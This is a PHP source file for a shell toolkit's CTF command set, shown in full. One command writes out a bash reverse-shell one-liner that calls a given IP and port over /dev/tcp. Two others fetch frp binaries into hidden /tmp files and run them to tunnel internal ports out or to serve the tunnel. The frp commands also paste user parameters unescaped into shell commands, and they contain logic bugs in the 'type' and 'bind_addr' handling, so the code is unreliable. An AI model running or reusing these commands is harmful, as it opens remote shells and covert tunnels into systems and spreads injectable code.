<?php

namespace QuickShell\Commands;

use QuickShell\Annotations\Command;
use QuickShell\Annotations\CommandArgument;
use QuickShell\Annotations\CommandCategory;
use QuickShell\Annotations\CommandOption;

#[CommandCategory('ctf', 'CTF工具库')]
class CTFCommand
{
    #[Command(name: 'reverse_shell', description: '使用bash反弹shell，提供一个目标的IP和TCP端口即可', alias: 'revshell')]
    #[CommandArgument(argument_name: 'ip', description: '目标IP')]
    #[CommandArgument(argument_name: 'port', description: '目标端口')]
    public function reverseShell(array $params)
    {
        return cmd('bash -i >& /dev/tcp/' . escapeshellarg($params['ip']) . '/' . intval($params['port']) . ' 0>&1 || { echo -e "\033[31mConnection failed, please check target listen port accessibility\033[0m "; false; }');
    }

    #[Command(name: 'frpc', description: '快速使用frpc代理一个内网穿透一个端口，提供一个目标的IP和TCP端口即可')]
    #[CommandArgument(argument_name: 'remote_addr', description: 'frps的服务器IP:端口')]
    #[CommandArgument(argument_name: 'local_ip', description: '本地监听IP')]
    #[CommandArgument(argument_name: 'local_port', description: '本地监听端口')]
    #[CommandArgument(argument_name: 'remote_port', description: '目标端口')]
    #[CommandOption(option_name: 'type', description: '链接类型（tcp或udp）', required: true)]
    #[CommandOption(option_name: 'token', description: 'frps连接的token', required: true)]
    public function frpc(array $params): string
    {
        $cmd = <<<CMD
case \$(uname -s) in
    Linux) mysys="linux" ;;
    Darwin) mysys="darwin" ;;
    *)
        echo "Unsupported OS"
        exit 1
        ;;
esac
case \$(uname -m) in
    x86_64) myarch=amd64 ;;
    aarch64) myarch=arm64 ;;
    *)
        echo "Unsupported arch"
        exit 1
        ;;
esac
if [ ! -f "/tmp/.qs_frpc" ]; then
    echo "sys: \$mysys"
    link="https://hub.fastgit.xyz/fatedier/frp/releases/download/v0.43.0/frp_0.43.0_\${mysys}_\${myarch}.tar.gz"
    echo "Downloading frp from \$link"
    curl \$link -o /tmp/frp.tgz -L && \
        cd /tmp && \
        tar -xzvf frp.tgz && \
        rm frp.tgz && \
        mv frp_0.43.0_\${mysys}_\${myarch}/frpc .qs_frpc && \
        rm -rf frp_0.43.0_\${mysys}_\${myarch}
fi
/tmp/.qs_frpc {use_type} -r {remote_port} -i {local_ip} -l {local_port} -s {remote_addr} {use_token}
CMD;
        $cmd = str_replace('{use_type}', $params['type'] === null ? 'tcp' : 'udp', $cmd);
        $cmd = str_replace('{remote_addr}', $params['remote_addr'], $cmd);
        $cmd = str_replace('{local_ip}', $params['local_ip'], $cmd);
        $cmd = str_replace('{local_port}', $params['local_port'], $cmd);
        $cmd = str_replace('{remote_port}', $params['remote_port'], $cmd);
        $cmd = str_replace('{use_token}', $params['token'] ? '-t ' . $params['token'] : '', $cmd);
        return cmd($cmd);
    }

    #[Command(name: 'frps', description: '快速启动一个frps内网穿透服务器')]
    #[CommandOption(option_name: 'bind_addr', description: 'frps的服务器监听的地址', required: true)]
    #[CommandOption(option_name: 'bind_port', description: 'frps的服务器监听的端口', required: true)]
    #[CommandOption(option_name: 'token', description: 'frps连接的token', required: true)]
    public function frps(array $params)
    {
        $cmd = <<<CMD
case \$(uname -s) in
    Linux) mysys="linux" ;;
    Darwin) mysys="darwin" ;;
    *)
        echo "Unsupported OS"
        exit 1
        ;;
esac
case \$(uname -m) in
    x86_64) myarch=amd64 ;;
    aarch64) myarch=arm64 ;;
    *)
        echo "Unsupported arch"
        exit 1
        ;;
esac
if [ ! -f "/tmp/.qs_frps" ]; then
    echo "sys: \$mysys"
    link="https://hub.fastgit.xyz/fatedier/frp/releases/download/v0.43.0/frp_0.43.0_\${mysys}_\${myarch}.tar.gz"
    echo "Downloading frp from \$link"
    curl \$link -o /tmp/frp.tgz -L && \
        cd /tmp && \
        tar -xzvf frp.tgz && \
        rm frp.tgz && \
        mv frp_0.43.0_\${mysys}_\${myarch}/frps .qs_frps && \
        rm -rf frp_0.43.0_\${mysys}_\${myarch}
fi
/tmp/.qs_frps {use_bind_addr} {use_bind_port} {use_token}
CMD;
        $cmd = str_replace('{use_bind_addr}', $params['bind_addr'], $cmd);
        $cmd = str_replace('{use_bind_addr}', $params['bind_addr'] !== null ? ('--bind-addr ' . $params['bind_addr']) : '', $cmd);
        $cmd = str_replace('{use_bind_port}', $params['bind_port'] !== null ? ('-p ' . $params['bind_port']) : '', $cmd);
        $cmd = str_replace('{use_token}', $params['token'] !== null ? ('-t ' . $params['token']) : '', $cmd);
        return cmd($cmd);
    }
}